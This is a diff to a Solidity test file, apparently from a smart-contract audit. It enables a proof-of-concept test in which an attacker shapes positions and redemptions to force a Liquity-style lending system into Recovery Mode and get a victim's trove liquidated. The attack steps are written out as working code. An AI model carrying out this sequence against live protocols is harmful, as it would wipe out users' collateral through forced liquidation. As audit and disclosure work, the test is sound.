@@ -167,48 +167,51 @@ contract PoCTest is TestSetup {
     console.log("TCR =", borrowerOps.getTCR());
   }
 
-  //   /**
-  //    * @dev Test case: Forcing the system into Recovery Mode
-  //    */
-  //   function test_poc_forcingSystemIntoRecoveryMode() public {
-  //     // Step 1: Victim opens a trove with ICR lower than CCR
-  //     vm.startPrank(victim);
-  //     _openTrove(sbtcTroveManager, 100000e18, 2e18);
+  /**
+   * @dev Test case: Forcing the system into Recovery Mode
+   */
+  function test_poc_forcingSystemIntoRecoveryMode() public {
+    console.log("Initial TCR:");
+    _printTCR();
 
-  //     // Step 2: Attacker opens a minimal position with CR slightly above 225%
-  //     vm.startPrank(attacker);
-  //     _openTrove(sbtc2TroveManager, 2000e18, 2.26e18);
+    // Step 1: Victim opens a trove with ICR lower than CCR
+    vm.startPrank(victim);
+    _openTrove(sbtcTroveManager, 100_000e18, 2e18);
 
-  //     // Step 3: Open a large position to bring TCR to exactly 225%
-  //     (uint256 totalPricedCollateral, uint256 totalDebt) = borrowerOps.getGlobalSystemBalances();
-  //     uint256 debtAmount = ((totalPricedCollateral - (225 * totalDebt * 1e18) / 100) * 100) / (225 - 200) / 1e18;
-  //     uint256 CR = 2e18;
-  //     _openTrove(sbtcTroveManager, debtAmount, CR);
+    // Step 2: Attacker opens a minimal position with CR slightly above 225%
+    vm.startPrank(attacker);
+    _openTrove(sbtc2TroveManager, 2_000e18, 2.26e18);
 
-  //     console.log("TCR after opening large position:");
-  //     _printTCR();
+    // Step 3: Open a large position to bring TCR to exactly 225%
+    (uint256 totalPricedCollateral, uint256 totalDebt) = borrowerOps.getGlobalSystemBalances();
+    uint256 debtAmount = ((totalPricedCollateral - (225 * totalDebt * 1e18) / 100) * 100) / (225 - 200) / 1e18;
+    uint256 CR = 2e18;
+    _openTrove(sbtcTroveManager, debtAmount, CR);
 
-  //     // Step 4: Redeem the position opened in step 2 to trigger Recovery Mode
-  //     (, uint256 attackerDebt) = sbtc2TroveManager.getTroveCollAndDebt(attacker);
-  //     uint256 redemptionAmount = attackerDebt - INIT_GAS_COMPENSATION; // 200e18 is the gas compensation
-  //     _redeemCollateral(sbtc2TroveManager, redemptionAmount);
+    console.log("TCR after opening large position:");
+    _printTCR();
 
-  //     console.log("TCR after redemption (should be in Recovery Mode):");
-  //     _printTCR();
+    // Step 4: Redeem the position opened in step 2 to trigger Recovery Mode
+    (, uint256 attackerDebt) = sbtc2TroveManager.getTroveCollAndDebt(attacker);
+    uint256 redemptionAmount = attackerDebt - INIT_GAS_COMPENSATION; // 200e18 is the gas compensation
+    _redeemCollateral(sbtc2TroveManager, redemptionAmount);
 
-  //     // Step 5: Liquidate victim's trove (CR < 225%)
-  //     liquidationMgr.liquidate(sbtcTroveManager, victim);
+    console.log("TCR after redemption (should be in Recovery Mode):");
+    _printTCR();
 
-  //     console.log("Victim's trove liquidated");
+    // Step 5: Liquidate victim's trove (CR < 225%)
+    liquidationMgr.liquidate(sbtcTroveManager, victim);
 
-  //     // Verify victim's trove is closed
-  //     (uint256 victimColl, uint256 victimDebt) = sbtcTroveManager.getTroveCollAndDebt(victim);
-  //     assertEq(victimColl, 0, "Victim's trove collateral should be zero");
-  //     assertEq(victimDebt, 0, "Victim's trove debt should be zero");
+    console.log("Victim's trove liquidated");
 
-  //     console.log("Final TCR:");
-  //     _printTCR();
-  //   }
+    // Verify victim's trove is closed
+    (uint256 victimColl, uint256 victimDebt) = sbtcTroveManager.getTroveCollAndDebt(victim);
+    assertEq(victimColl, 0, "Victim's trove collateral should be zero");
+    assertEq(victimDebt, 0, "Victim's trove debt should be zero");
+
+    console.log("Final TCR:");
+    _printTCR();
+  }
 
   //   /**
   //    * @dev Test case: Normal redemption process
